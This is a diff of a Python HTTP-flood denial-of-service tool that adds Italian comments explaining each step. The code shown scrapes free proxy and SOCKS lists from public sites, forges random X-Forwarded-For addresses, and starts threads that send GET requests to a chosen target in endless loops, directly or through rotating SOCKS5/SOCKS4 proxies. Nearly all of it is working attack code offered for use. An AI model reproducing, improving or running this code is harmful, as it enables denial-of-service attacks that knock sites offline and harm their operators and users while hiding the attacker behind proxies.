@@ -14,7 +14,8 @@ useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)
 			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
 			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",]
 
-def checkurl():
+
+def checkurl(): # in questa funzione setto l'url per renderlo usabile durante il settaggio della richieste HTTP.
 	global url
 	global url2
 	global urlport
@@ -99,12 +100,12 @@ def choisemirror2():
 		print("You mistyped, try again.")
 		choisemirror2()
 
-def proxyget1():
+def proxyget1(): # lo dice il nome, questa funzione scarica i proxies
 	try:
-		req = urllib.request.Request(("%s") % (urlproxy))
-		req.add_header("User-Agent", random.choice(useragents))
-		sourcecode = urllib.request.urlopen(req)
-		part = str(sourcecode.read())
+		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
+		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito è identico sia
+		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
+		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
 		part = part.split("<tbody>")
 		part = part[1].split("</tbody>")
 		part = part[0].split("<tr><td>")
@@ -123,7 +124,7 @@ def proxyget1():
 		print ("ERROR!")
 	proxylist()
 
-def proxyget2():
+def proxyget2(): # anche questa funzione scarica proxy però da inforge.net
 	try:
 		if os.path.isfile("proxy.txt"):
 			out_file = open("proxy.txt","w")
@@ -132,14 +133,14 @@ def proxyget2():
 		else:
 			pass
 		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
-		soup = BeautifulSoup(urllib.request.urlopen(url))
-		base = "https://www.inforge.net/xi/"
-		for tag in soup.find_all("a", {"class":"PreviewTooltip"}):
-			links = tag.get("href")
-			final = base + links
-			result = urllib.request.urlopen(final)
+		soup = BeautifulSoup(urllib.request.urlopen(url)) # per strasformare in "zuppa" la source del sito
+		base = "https://www.inforge.net/xi/"                       # questi comandi servono per trovare i link nella sezione
+		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): # liste-proxy del forum
+			links = tag.get("href")                                #
+			final = base + links                                   #
+			result = urllib.request.urlopen(final)                 # finalmente apre i link trovati
 			for line in result :
-				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line))
+				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca gli ip:porta dei proxy
 				if ip:
 					print("Grabbed=> "+"\n".join(ip))
 					for x in ip:
@@ -183,26 +184,27 @@ def begin():
 		exit(0)
 
 def loop():
-	print ("\nSending bombs to the target.")
+	print ("\nSending bombs to the target.") # non sapevo che scrivere lol
 	global threads
-	for x in range(threads):
-		attack().start()
+	for x in range(threads): # con questa forumula diciamo ai threads di attaccare.
+		attack().start() # start() non fa altro che leggere nella classe threading.Thread cercando la funzione run(self), la quale
+                         # serve per dare istruzioni ai threads.
 
-class attack(threading.Thread):
+class attack(threading.Thread): # la classe del multithreading
 
-	def run(self):
-		self.setuprequest()
+	def run(self): # la funzione che dà le istruzioni ai vari threads
+		self.setuprequest() # intanto costruiamo l' anteprima della richiesta (anteprima perchè la final request sarà dopo)
 		if choise1 == "y":
 			if choise2 == "0":
-				self.requestproxy()
+				self.requestproxy() # se abbiamo scelto la modalità proxy, esegue attacco con proxy
 			elif choise2 == "1":
-				self.requestsocks()
+				self.requestsocks() # se abbiamo scelto la modalità socks, esegue attacco con socks
 			else:
 				exit(0)
 		else:
-			self.requestdefault()
+			self.requestdefault() # altrimenti manda richieste normali non proxate.
 
-	def setuprequest(self):
+	def setuprequest(self): # composizione anteprima richiesta
 		global get_host
 		global useragent
 		global accept
@@ -210,37 +212,37 @@ class attack(threading.Thread):
 		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
 		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 		accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
-		connection = "Connection: Keep-Alive\r\n"
+		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
 
-	def requestproxy(self):
+	def requestproxy(self): # funzione dedicata all'invio di richiesto tramite proxy
 		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
-		forward = "X-Forwarded-For: " + randomip + "\r\n"
-		request = get_host + useragent + accept + forward + connection + "\r\n"
-		proxy = random.choice(entries).strip().split(":")
-		while True:
+		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
+		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
+		proxy = random.choice(entries).strip().split(":") # selezione proxy casuale
+		while True: # ciclo infinito
 			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.setblocking(0)
-				s.connect((str(proxy[0]), int(proxy[1])))
-				s.send(str.encode(request))
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
+				s.setblocking(0) # settaggio socket non bloccante. per info vai su google
+				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
+				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1])) # print delle richieste (a volte nemmeno printa se l'attacco è troppo pesante)
 			except:
-				s.close()
+				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
 
-	def requestsocks(self):
-		request = get_host + useragent + accept + connection + "\r\n"
-		proxy = random.choice(entries).strip().split(":")
+	def requestsocks(self): # funzione per invio richieste tramite socks
+		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
+		proxy = random.choice(entries).strip().split(":") # selezione di proxy causale
 		while True:
 			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-				s = socks.socksocket()
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
+				s = socks.socksocket() # creazione socket con pysocks
 				s.setblocking(0)
 				s.connect((str(url2), int(urlport)))
 				s.send (str.encode(request))
 				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
-			except:
-				try:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			except: # questo except collegga al try sotto.
+				try: # il try prova a vedere se l'errore è causato dalla tipologia di socks errata, infatti prova con SOCKS4
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
 					s = socks.socksocket()
 					s.setblocking(0)
 					s.connect((str(url2), int(urlport)))
@@ -248,10 +250,10 @@ class attack(threading.Thread):
 					print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
 				except:
 					print ("Socks down. Retrying request.")
-					s.close()
+					s.close() # se nemmeno con quel try si è riuscito a inviare niente, allora il sock è down e chiude il socket.
 
-	def requestdefault(self):
-		request = get_host + useragent + accept + connection + "\r\n"
+	def requestdefault(self): # funzione per l'invio di richieste non proxate
+		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
 		while True:
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -262,4 +264,4 @@ class attack(threading.Thread):
 			except:
 				pass
 
-checkurl()
+checkurl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
